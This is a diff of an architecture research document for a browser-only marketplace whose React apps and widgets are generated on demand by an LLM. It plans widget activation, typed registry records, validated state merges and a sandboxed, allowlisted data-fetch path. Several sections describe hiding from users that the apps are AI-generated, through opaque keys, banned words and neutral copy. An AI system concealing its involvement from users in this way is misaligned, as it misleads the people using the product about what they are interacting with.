+- MODIFY `AppRecord` (`db.ts:30`) — add optional `displayName?`, `prompt?`, `description?`, `createdAt?`. Additive, no DB version bump required (the interface already has `[key: string]: unknown` forward-compat and the adapter tolerates missing fields). If you want a `by-useCount` index for an efficient popular query, that IS a `REGISTRY_DB_VERSION` bump (`db.ts:13`) with an additive `createObjectStore`/`createIndex` in `upgrade` (`db.ts:51`).
+- MODIFY the loader's two `registry.put` sites (`loader.ts:286` produce-write, `loader.ts:55` touch-write) and the tweak path to carry `displayName`/`prompt`. The values flow in from `Marketplace.handleOpen` (which already has `displayName`, `Marketplace.tsx:146`) and `handleModify` (which has `routed.instruction` as the prompt).
+- NEW query: `topByUseCount(limit)` in `src/registry/` (or a small `src/data/popular.ts`) — reads `apps` keys (`registry.keys`, `registry.ts:95`), sorts by `useCount` desc, returns the top N records' `{type, displayName}`. KISS: a full scan is fine at this scale (tens of records); add the index only if needed.
+- NEW UI: a "Popular on the platform" row in `Marketplace.tsx` above the grid, mapping `topByUseCount` results to the existing `app-card` markup. Hygiene: copy must avoid the banned lexicon and not narrate the mechanic. Empty-state: hide the row until ≥1 app has `useCount > 0`.
 
-There is no global app-state store and the architecture is better for it. Three explicit state locations:
-
-```
-localStorage          marketplace.apiKey, marketplace.theme        (config)
-IndexedDB MarketplaceDB   apps · widgets · handlers                (durable registry)
-in-memory               registryCache · transpiledCache · roots    (session)
-React component state    inside each generated app/widget          (isolated, ephemeral)
-```
-
-Generated apps own their own `useState`; they **cannot** reach marketplace state (the `new Function()` scope gives them only `React` + `useWidget`). This isolation is a security property, not just tidiness.
-
-### Key Data Flows
-
-1. **Compile-once:** `sourceJSX` is transpiled exactly once (on miss), the `transpiledJS` string is persisted, and Babel never runs again for that key — the transpiled `Map` serves it for the rest of the session, IndexedDB across reloads.
-2. **Pre-warm closure:** an app's declared widget set (transitively) is fully resolved into live components *before* first paint, so the render pass never awaits.
-3. **Single network egress:** every model interaction (classify fallback, app/widget/handler generation, self-heal) funnels through one host function — the only place a prompt leaves the browser.
+**New vs modified:** NEW `src/data/popular.ts` (or registry query) + a row in `Marketplace.tsx`. MODIFIED: `db.ts` (`AppRecord` fields; optional version bump for an index), loader/tweak `put` sites. No execution-engine change.
 
 ---
 
-## Build Order — Vertical-MVP Slices
+## Feature D — Activate widgets (G3 typing + G1-followups cache key)
 
-Each slice ships an **end-to-end, user-visible capability**. Earlier slices are dependencies of later ones; nothing below is a horizontal "build all of layer N" phase.
+The widget machinery is **built but dormant**: `prewarmWidgets` (`widgetPrewarm.ts:187`), `parseWidgetDeps` (`widgetParse.ts:36`), and `useWidget` injection (`instantiate.ts:41`) all work and are tested — but the **delegated default never declares `@widget`** (the delegated module is a behavior-free view; only the monolithic `"app"` prompt mentions widgets, `producer.ts:200`). Activating widgets for delegated apps is the open work.
 
-> Dependency legend: a slice may only use components delivered in itself or an earlier slice.
+**Sub-parts and integration points:**
 
-**Slice 0 — Hygiene + shell skeleton (foundation, thin but user-visible).**
-Deliver: marketplace page renders, AppBar with API-key config + theme toggle, neutral CSS variables on `:root`, the gated logger, opaque `cacheKey()`, and the single `host/modelClient.ts` stub (header assembly incl. `anthropic-dangerous-direct-browser-access`).
-*Why first:* the devtools-hygiene constraints (naming, opaque keys, log gating, the mandatory browser-access header) are **cheaper to bake in than retrofit**, and every later slice depends on the host boundary and cacheKey. User sees a real storefront and can save a key.
-Depends on: nothing.
+1. **Make delegated apps declare/use widgets.** The delegated `view(state)` returns markup; it has no `useWidget` in scope (only the monolithic `instantiate` injects `useWidget`/`runHandler`). Two paths:
+   - (a) Pre-warm declared widgets from the **delegated module source** before mounting `DelegatedShell` (run `prewarmWidgets(source, services)` in the `"delegated"` branch of `instantiateApp`, `loader.ts:136`), and inject the resulting widget map into the view scope. Requires `instantiateDelegated` to optionally bind a `useWidget` the view can call. MODIFY `delegated.tsx:59` and the delegated prompt to permit `// @widget` + a `useWidget` call inside `view`.
+   - (b) KISS alternative: keep `view` widget-free for v1.1 and only activate widgets on the **monolithic** path (already wired). Lower value but zero delegated-path risk. **Recommend (a)** since the milestone goal is first-class widget composition for the default (delegated) apps.
+2. **Type `WidgetRecord` / `HandlerRecord`** (`db.ts:37-38`). Replace `Record<string, unknown> & LruMeta` with real schemas mirroring `AppRecord`: `{ cacheKey; type; source; transpiledJS } & LruMeta` for widgets; `{ cacheKey; intent; source; transpiledJS } & LruMeta` for handlers (the handler write at `handler.ts:214` and widget write at `widgetPrewarm.ts:99` already produce exactly these shapes — the types just lag the data). Pure type tightening; will surface any field drift at `tsc` time.
+3. **Fully fold `kind` + prompt into the widget cache key (G1-followups).** `registryKey(kind, type, prompt)` (`cacheKey.ts:51`) **already folds all three correctly** — and `resolveWidget` already calls `registryKey("widget", widgetType)` (`widgetPrewarm.ts:61`) and `resolveWidgetTweak` calls `registryKey("widget", widgetType, instruction)` (`widgetPrewarm.ts:133`). So the keying primitive is done. The G1-followups risk is the **latent bare-`SHA-256(type)` collision** noted in PROJECT.md: audit that **no remaining call path** keys a widget/handler by type alone, and that a widget and an app of the same slug (e.g. both `"chart"`) get distinct keys (they do — kind is folded). The work is an **audit + tests** proving (a) app `chart` ≠ widget `chart` key, (b) widget `chart` baseline ≠ widget `chart` + tweak key — not new keying code.
 
-**Slice 1 — Open-one-static-app end to end (the loop, minus the model).**
-Deliver: IndexedDB init (`apps` store), Intent Resolver (static map), registry resolve, transpile (classic), instantiate, mount via the roots map inside AppShell, ErrorBoundary. Seed one app's `sourceJSX` locally (no model yet).
-*Why here:* proves the **resolve→compile→instantiate→render** core — the product's whole reason for being — with model risk removed. First slice where a user opens an app and it works.
-Depends on: Slice 0 (shell, cacheKey, mount container).
-
-**Slice 2 — Cache-miss generation (the model joins the loop).**
-Deliver: `widgets`-less app generation via `host.modelClient`, clean, store, self-heal loop (≤3, Babel error fed back). Now an app the user opens that isn't seeded gets produced, compiled, cached, rendered.
-*Why here:* turns the static loop of Slice 1 into the real on-demand loop. The illusion (`hit = instant, miss = seamless`) becomes demonstrable.
-Depends on: Slice 1 (compile/mount path), Slice 0 (host boundary).
-
-**Slice 3 — Composition: widgets + pre-warm + sync `useWidget`.**
-Deliver: `widgets` store, `@widget` dep parser, transitive `prewarm`, `makeUseWidget` injection, WidgetShell with its own ErrorBoundary and `⋮`. Apps now render sub-widgets, each isolated.
-*Why here:* this is the slice where the three hard concerns (sync `useWidget`, pre-warm-before-mount, per-widget isolation) all land together — they are meaningless individually and must ship as one capability.
-Depends on: Slice 2 (generation can now produce widgets too), Slice 1 (mount/ErrorBoundary).
-
-**Slice 4 — Contextual modification: remove / clone / tweak.**
-Deliver: ContextualPrompt popover, prompt router, in-place re-render via the roots map (reuse root), new-cacheKey-on-tweak. Remove/clone are client-only; tweak re-enters resolve.
-*Why here:* needs live instances (Slices 1–3) to act upon and the roots map to mutate in place. First slice where the user *shapes* apps, not just opens them.
-Depends on: Slice 3 (instances + roots map + shells with `⋮`).
-
-**Slice 5 — Resilience hardening + graceful degradation.**
-Deliver: missing/invalid key, 401, 429 backoff, IndexedDB-unavailable → in-memory fallback, neutral non-revealing error copy everywhere. (ErrorBoundary already exists from Slice 1; this slice completes the *generation*-error matrix and the messaging.)
-*Why here:* you can only harden paths that exist; doing it as its own slice forces the neutral-copy hygiene review across the whole surface at once.
-Depends on: Slices 2–4 (the error sources).
-
-**Slice 6 — Backend-style handlers (optional layer).**
-Deliver: `handlers` store, `runHandler(intent,input)` resolve-or-produce-then-exec, handler prompt template.
-*Why last:* fully independent of the UI loop; nothing above depends on it; it reuses the resolve-or-produce engine wholesale. Pure additive capability.
-Depends on: Slice 2's generation engine + Slice 0's host boundary.
-
-**Ordering rationale (dependencies made explicit):**
-- The **host boundary + cacheKey + hygiene scaffolding (Slice 0)** must precede every model call and every stored key — retrofitting opaque keys or the mandatory CORS header after data exists is painful.
-- **Compile/mount (Slice 1) before generation (Slice 2):** de-risk the novel runtime mechanics with seeded source before adding model nondeterminism.
-- **Generation (Slice 2) before composition (Slice 3):** widgets are *produced* the same way apps are; composition can't exist until the generation engine does.
-- **Composition (Slice 3) before modification (Slice 4):** tweak/clone/remove operate on live, possibly-composed instances and the roots map.
-- **Resilience (Slice 5) after the happy paths exist**, and **handlers (Slice 6) last** as an isolated additive layer.
-
-**First end-to-end slice the product can ship on:** Slice 1 (open one app, it renders and works) is the minimum demonstrable loop; Slice 2 makes it the *real* product (apps that don't exist yet appear on demand). The PROJECT.md core value ("opens an app and it works, instant on hit, seamless on miss") is met at the end of Slice 2.
+**New vs modified:** Mostly MODIFIED — `db.ts` (real record types), `delegated.tsx` + `instantiateDelegated` (+optional `useWidget` in view), the delegated prompt (`producer.ts`), `loader.ts` delegated branch (pre-warm). NEW: cache-key collision tests. The hardest part is (1a) wiring `useWidget` into the delegated view scope; everything else is typing + an audit.
 
 ---
 
-## Scaling Considerations
+## Data-Flow Changes (summary)
 
-This is a single-user, client-only app; "scale" means data growth and produced-asset volume per browser, not concurrent users.
+```
+A (network data):
+  view/handler ─ fetchData(sourceId, params) ─▶ Services.fetchData ─▶ dataBroker
+        ─▶ dataSources[sourceId].buildUrl ─▶ host fetch ─▶ allowlisted keyless origin
+        ◀─ { data } | { error }  (key never in this path; URL host-built)
 
-| Scale | Adjustments |
-|-------|-------------|
-| 1 user, tens of apps | Nothing. IndexedDB + in-mem maps are ample. |
-| Hundreds of cached apps/widgets | Add `useCount`/`updatedAt`-based eviction (already in schema) before IndexedDB bloat hurts open time; lazy-hydrate the registry rather than loading all rows at init. |
-| Heavy session (many distinct types) | Cap the in-memory component `Map` (LRU) so live functions don't accumulate; transpiled strings can stay in IndexedDB and re-instantiate on demand. |
+B (reliability):
+  DelegatedShell.onClick ─ runHandler ─▶ { data:{ state } }
+        ─▶ validateTransition(initialState, next) ─▶ merge known keys | keep-prior
 
-### Scaling Priorities
+C (storefront):
+  produce/touch write ─▶ AppRecord{ +displayName,+prompt,+createdAt, useCount }
+  Marketplace mount ─ topByUseCount(N) ─▶ "Popular" row
 
-1. **First bottleneck — first cache miss latency:** dominated by the model round-trip + the eager ~450KB Babel load. Babel must load at init (not lazily) so the first miss doesn't also pay the download. This is a correctness-of-feel issue, not a user-count issue.
-2. **Second bottleneck — registry hydration on reload:** loading every stored row at startup grows linearly with cached assets. Hydrate lazily (load a row when its key is first resolved) and keep only an index in memory at boot.
-
----
-
-## Anti-Patterns
-
-### Anti-Pattern 1: New `createRoot()` per render/tweak
-**What people do:** Call `ReactDOM.createRoot(container)` again to re-render after a tweak.
-**Why it's wrong:** React warns "container has already been passed to createRoot," double-manages the node, and leaks the old root.
-**Do this instead:** Create once, store in the roots map, call `root.render()` to update, `root.unmount()` to remove.
-
-### Anti-Pattern 2: Automatic JSX runtime (or relying on the Babel default)
-**What people do:** Use `preset react` defaults, or set automatic runtime.
-**Why it's wrong:** Automatic runtime emits `import { jsx } from "react/jsx-runtime"` — an unresolvable import inside `new Function()`. Babel 8 will default to automatic, so even "do nothing" eventually breaks.
-**Do this instead:** Pin `["react", { runtime: "classic" }]` so JSX → `React.createElement`, resolved by the injected `React`.
-
-### Anti-Pattern 3: A second React (global/CDN) for generated code
-**What people do:** Expose `window.React` or load React from a CDN for generated apps "to be safe."
-**Why it's wrong:** Two React instances → "Invalid hook call / dispatcher is null." It also re-introduces the global pollution the security model forbids.
-**Do this instead:** One imported React, injected by reference into every scope; generated code never imports React (prompt-enforced and scope-unresolvable).
-
-### Anti-Pattern 4: Async work inside `useWidget` / during render
-**What people do:** `useWidget` triggers a generate/await when the widget isn't ready.
-**Why it's wrong:** Violates the synchronous-render contract, causes waterfalls and flicker, and can loop.
-**Do this instead:** Pre-warm the transitive dep closure before mount so `useWidget` is a pure `Map.get`; reserve async only for the documented dynamic-widget fallback (skeleton + background resolve + re-render).
-
-### Anti-Pattern 5: Persisting instantiated functions
-**What people do:** Store the `new Function()` result (or a memoized component) in IndexedDB.
-**Why it's wrong:** Functions aren't structured-cloneable; recompilation becomes uncontrolled.
-**Do this instead:** Persist only the `transpiledJS` string; re-instantiate on load; keep live functions in the session-scoped component map.
-
-### Anti-Pattern 6: Leaking the mechanic into a devtools-visible surface
-**What people do:** Name a store `synthesizedApps`, log `"generating widget…"`, attach `data-generated`, or put the type slug in a readable IndexedDB key.
-**Why it's wrong:** Any one leak breaks the entire product premise (apps "just exist").
-**Do this instead:** Opaque hashed keys; neutral store/CSS/symbol names; a single logger gated behind `localStorage.debug` emitting neutral copy; neutral prompt phrasing in the request body. See the dedicated section below.
+D (widgets):
+  delegated produce ─ source(@widget) ─▶ prewarmWidgets ─▶ useWidget map ─▶ view scope
+  registryKey(kind,type,prompt) keeps app/widget/tweak keys distinct (already correct)
+```
 
 ---
 
-## Architectural Decisions Forced by Constraints
+## Suggested Phase Build Order (dependency-aware)
 
-### Forced by "no backend"
-- **Single network egress to `api.anthropic.com` only**, carrying the user's key — so the host boundary is one file and the CORS/header handling lives in exactly one place.
-- **Handlers run in-browser** against mock/local data; "backend" is a generation target, not a server. `runHandler` is just resolve-or-produce-then-exec.
-- **No server-side cache/registry** → IndexedDB is the durable tier and the in-memory maps are the fast tier; there is no third place to fall back to except an in-memory `Map` when IndexedDB is unavailable.
+> Ordering principle: ship the **highest-value, lowest-coupling** slice first; do the schema/typing groundwork before the features that depend on it; tackle the hard network path on a clean base.
 
-### Forced by direct-browser Anthropic calls (verified)
-- Calls to `api.anthropic.com/v1/messages` from the browser **require the `anthropic-dangerous-direct-browser-access: true` request header**, plus `x-api-key` and `anthropic-version`. This is mandatory for CORS to succeed.
-- **Tension with network-tab hygiene, and its resolution:** the header name and the `api.anthropic.com` host are themselves visible in the Network tab and *cannot* be hidden in a no-backend design. Hygiene therefore targets what *is* controllable — the request **body** (neutral prompt phrasing: "Generate a React component for a weather app," never anything that names the mechanic) and **not** the unavoidable host/header. This is a real, documented limitation of the client-only model: a sufficiently determined observer sees an Anthropic call; the defense is that the *content* never narrates "this app was produced on demand," and the product never exposes a generate button. Flag for the roadmap: the hygiene requirement should be scoped to "no surface *narrates the mechanic*," not "no evidence of an LLM call exists," which is unachievable without the explicitly-out-of-scope proxy.
+1. **Phase 1 — Storefront depth (Feature C).** *No dependencies; lowest risk; immediately visible.* Persist `displayName`/`prompt`/`createdAt` on `AppRecord`, add `topByUseCount`, render the popular row. Establishes the additive-schema-change muscle and gives a quick win. (`useCount` already persists, so the popular row is nearly free.)
 
-### Forced by devtools-hygiene (structural, not cosmetic)
-- **Opaque cache keys** (hash of normalized `kind::type::prompt`, no readable slug) → IndexedDB key names reveal nothing. This shapes `cacheKey.ts` and means keys must be derivable identically every time (normalize before hashing).
-- **Neutral module/store/CSS/symbol naming throughout** (`apps`/`widgets`/`handlers`, `.app-shell`/`.widget-frame`, `resolveApp`/`AppRegistry`). Internal terms (`synthesize`/`generate`) may appear *only* where source maps can't expose them — and since source maps can, the safest rule is: **the token "synthesize/synthesized/synthesis" appears in zero source files**, comments included. This is a lint-enforceable invariant worth a CI check in Slice 0.
-- **A single gated logger** (`host/` or a tiny `log.ts`): off by default, enabled via `localStorage.debug`, neutral copy only. Centralizing it prevents stray `console.log` leaks and is why the logger ships in Slice 0.
-- **Neutral error copy** ("Couldn't load this app. Try again.") wherever errors reach UI or console — handled as a cross-cutting rule completed in Slice 5's messaging pass.
-- **No `data-*` mechanic attributes** on rendered apps/widgets; shells use structural attributes only.
+2. **Phase 2 — Schema & key hardening (Feature D, parts 2+3).** *Foundation for D and a guardrail for everything.* Replace `WidgetRecord`/`HandlerRecord` stubs with real types; add the cache-key collision audit + tests (app `chart` ≠ widget `chart`; baseline ≠ tweak). Pure typing/tests — de-risks later phases that read these stores. Do this **before** activating widgets so the activation lands on typed records.
 
-These hygiene choices are concentrated in Slice 0 precisely because keys, naming, and the logger are foundational and expensive to change once data and modules exist.
+3. **Phase 3 — Reliability hardening (Feature B).** *Depends on nothing new; should precede the network path so live-data transitions are validated.* Add `stateContract.validateTransition`, wire it into the `DelegatedShell` merge step, add deterministic tests with captured handlers. Optionally one self-heal retry. This makes the merge step trustworthy **before** it starts merging network-derived state in Feature A.
+
+4. **Phase 4 — Sanctioned network-data path (Feature A).** *The hard one; built last on a validated base.* Add `dataSources` manifest + `dataBroker.fetchData`, extend `Services`, inject `fetchData` into the handler/delegated scope, widen CSP to the explicit allowlist (+ update `csp.test.ts`), teach the prompts the `fetchData` global with NO-OP rules, fire a mount `load` action for initial data. Lands on Phase 3's validated merge (so live data can't drift state) and Phase 2's typed handler records.
+
+5. **Phase 5 — Activate widgets in delegated views (Feature D, part 1).** *Depends on D's typing (Phase 2) and benefits from a stable producer prompt (Phases 3-4 already edited prompts).* Wire `prewarmWidgets` + a `useWidget` accessor into the delegated `view` scope; update the delegated prompt to permit `// @widget`. Last because it touches the delegated render path that Phases 3-4 also evolve — sequencing it after avoids churn/merge conflicts on `delegated.tsx`.
+
+**Dependency rationale:** C is independent and fast → first. D's typing (2) is a foundation gate. B (3) must precede A (4) so network-derived state is validated by an already-trusted merge step. A (4) precedes D's widget-activation (5) only to keep `delegated.tsx` edits serialized (both touch the same file) and because the prompt edits compound. The only hard ordering constraints are **B before A** (validate before merging live data) and **D-typing (2) before D-activation (5)**; the rest optimizes for low merge-conflict churn on `delegated.tsx`/`producer.ts`.
+
+---
+
+## Anti-Patterns (v1.1-specific)
+
+### Anti-Pattern 1: Un-shadowing `fetch` in the handler scope to enable live data
+**What people do:** add `fetch` back to the handler's reachable globals (remove it from `DENIED_GLOBALS`).
+**Why it's wrong:** restores arbitrary egress in untrusted scope AND forces `connect-src '*'` — re-opening the exact key-exfiltration hole the CSP closes.
+**Do this instead:** inject the host-bound `fetchData(sourceId, params)`; keep `fetch`/`XMLHttpRequest` shadowed forever; widen CSP only to enumerable keyless origins.
+
+### Anti-Pattern 2: Letting generated code supply the URL/origin
+**What people do:** `fetchData(url, opts)` where the model writes the full URL.
+**Why it's wrong:** SSRF-by-prompt — a hallucinated/hostile URL points the trusted host at an attacker origin, defeating the allowlist.
+**Do this instead:** the model supplies only a `sourceId` (must exist in the manifest) + params; the host builds the URL from a template.
+
+### Anti-Pattern 3: Trusting the returned state shape at the merge step
+**What people do:** `setState(prev => ({ ...prev, ...next }))` with no validation (today's behavior).
+**Why it's wrong:** a drifting handler injects hallucinated keys / coerced types → silent state corruption.
+**Do this instead:** `validateTransition(initialState, next)` — merge only keys present in the SSOT with matching types; keep-prior otherwise.
+
+### Anti-Pattern 4: Re-implementing the widget cache key
+**What people do:** "fix G1" by writing a new keying function for widgets.
+**Why it's wrong:** `registryKey` already folds `kind+type+prompt` correctly; the risk is a *latent bare-type call path*, not the primitive.
+**Do this instead:** audit call sites + add collision tests; do not touch `cacheKey.ts`.
 
 ---
 
@@ -430,40 +267,31 @@ These hygiene choices are concentrated in Slice 0 precisely because keys, naming
 
 | Service | Integration Pattern | Notes |
 |---------|---------------------|-------|
-| `api.anthropic.com/v1/messages` | Single `fetch` in `host/modelClient.ts`; `x-api-key` (user's), `anthropic-version`, **`anthropic-dangerous-direct-browser-access: true`** (mandatory for CORS), neutral prompt body | Host + header are unavoidably visible; only the body is hygiene-controllable. Key never logged/proxied. |
-| `@babel/standalone` (CDN/npm) | Loaded **eagerly at init**; `Babel.transform` with pinned classic runtime | ~450KB — must not block first cache miss. |
-| IndexedDB (`idb` optional) | Async CRUD behind `db/`; structured-clone-safe rows only (strings, never functions) | Degrade to in-memory `Map` if unavailable. |
-| `localStorage` | `store/` for neutral `marketplace.apiKey` / `marketplace.theme` | Keys are neutral and product-branded. |
+| Anthropic Messages API | existing single egress (`modelClient.ts`), key from `localStorage`, browser-direct header | unchanged; remains the only authenticated origin |
+| Open-Meteo (`api.open-meteo.com`) | NEW host-brokered GET via `dataBroker`, keyless, CORS | weather forecast by lat/lon; add to `connect-src` |
+| Open-Meteo Geocoding | NEW host-brokered GET, keyless, CORS | place-name → lat/lon for Weather |
+| Frankfurter (`api.frankfurter.dev`) | NEW host-brokered GET, keyless, CORS | live FX; add to `connect-src` |
 
 ### Internal Boundaries
 
 | Boundary | Communication | Notes |
 |----------|---------------|-------|
-| Intent ↔ Registry | direct async call (`resolve(intent)`) | cacheKey is the contract |
-| Registry ↔ Generation | direct async call on miss | Generation writes back to Registry |
-| Registry/Generation ↔ Execution | **async → sync handoff** | The defining boundary: no `await` crosses into render |
-| Execution ↔ generated component | `new Function()` named scope (`React`, `useWidget`) | The only channel into untrusted code; no globals cross it |
-| App ↔ its widgets | `useWidget` returns pre-resolved components | Widgets can't reach app/marketplace state |
-| Everything ↔ network | the one `host.modelClient` function | Single egress; single hygiene chokepoint |
+| generated code ↔ host data | `fetchData(sourceId, params)` bound closure (like `runHandler`) | key never crosses; URL host-built |
+| `DelegatedShell` ↔ produced handler | `runHandler` intent + `{state,payload}` → `{data:{state}}`, now validated | add `validateTransition` at merge |
+| loader ↔ registry stores | `Services.registry` get/put, now with typed `WidgetRecord`/`HandlerRecord` | typing only; shapes already match |
+| `Marketplace` ↔ registry | NEW `topByUseCount` read for the popular row | full-scan acceptable at this scale |
+| `Services` ↔ everything | NEW `fetchData` member; IoC seam for test substitution | preserves offline-test invariant |
 
 ---
-
-## Open Questions / Flags for Roadmap
-
-- **Dynamic (undeclared) widgets:** the skeleton-then-async fallback is sound but is the one place `useWidget` touches async — confirm in Slice 3 whether the product needs it at all, or whether all widgets are statically declared (simpler, fully sync).
-- **Instance identity vs cache identity:** the roots map must key on instance id, not cacheKey, so two instances of the same app type can coexist. Worth an explicit decision when Slice 1's mount map is designed.
-- **Hygiene scope reality check (Slice 0/5):** agree explicitly that "no surface narrates the mechanic" is the achievable bar, since the Anthropic host/header are visible by construction in a no-proxy design.
-- **Babel-version pin:** treat the classic-runtime pin as a hard dependency constraint; a Babel 8 default flip would silently break instantiation if unpinned.
 
 ## Sources
 
-- React — `createRoot` (create-once / render-to-update / unmount contract; double-call warning): https://react.dev/reference/react-dom/client/createRoot — HIGH
-- React — Invalid Hook Call (single-instance requirement; dispatcher mismatch): https://legacy.reactjs.org/warnings/invalid-hook-call-warning.html — HIGH
-- Babel — `@babel/preset-react` (classic vs automatic runtime; classic → `React.createElement`, Babel 8 default flips to automatic): https://babeljs.io/docs/babel-preset-react/ — HIGH
-- Babel — `@babel/standalone` (browser transform API, no config-file access, presets passed inline): https://babeljs.io/docs/babel-standalone/ — HIGH
-- Anthropic direct-browser CORS — mandatory `anthropic-dangerous-direct-browser-access` header: https://simonwillison.net/2024/Aug/23/anthropic-dangerous-direct-browser-access/ — HIGH
-- Project blueprint: `docs/vibeappstore.md`; project context: `.planning/PROJECT.md` — HIGH (primary source)
+- Existing code (read 2026-06-25, HIGH): `src/execution/{loader.ts,delegated.tsx,handler.ts,instantiate.ts,producer.ts,widgetParse.ts,widgetPrewarm.ts}`, `src/registry/{db.ts,cacheKey.ts,registry.ts}`, `src/services/services.ts`, `src/host/modelClient.ts`, `src/data/appRegistry.ts`, `src/ui/Marketplace.tsx`, `index.html`, `.planning/PROJECT.md`
+- Prior research consults (HIGH, in-repo): `.planning/research/CONSULT-thin-shell-on-demand-handlers.md`, `.planning/research/CONSULT-activating-widgets-handlers.md`
+- [Open-Meteo — free weather API, no key, CORS supported](https://open-meteo.com/) — MEDIUM-HIGH (cross-confirmed by repo + multiple dev write-ups)
+- [Open-Meteo GitHub](https://github.com/open-meteo/open-meteo) — MEDIUM-HIGH
+- [Frankfurter — free FX API, no key, public](https://frankfurter.dev/) — MEDIUM-HIGH (84 central banks, no quotas)
 
 ---
-*Architecture research for: client-side generative-UI app marketplace (no-build in-browser React runtime)*
-*Researched: 2026-06-24*
+*Architecture research for: Vibe App Store v1.1 "Real & Robust" — four-feature integration into the existing client-only generative marketplace*
+*Researched: 2026-06-25*
